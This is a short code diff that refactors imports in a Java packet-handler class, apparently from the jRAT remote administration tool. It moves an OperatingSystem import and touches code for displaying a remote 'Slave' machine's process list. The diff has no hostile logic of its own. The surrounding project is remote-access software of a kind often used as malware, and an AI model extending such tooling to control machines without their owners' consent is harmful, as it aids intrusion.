@@ -3,11 +3,11 @@ package pro.jrat.packets.incoming;
 import java.io.DataInputStream;
 
 import pro.jrat.Slave;
+import pro.jrat.common.OperatingSystem;
 import pro.jrat.ui.frames.FrameControlPanel;
 import pro.jrat.ui.frames.FrameRemoteProcess;
 import pro.jrat.ui.panels.PanelControlRemoteProcess;
 
-import com.redpois0n.common.OperatingSystem;
 
 
 public class Packet20Process extends AbstractIncomingPacket {
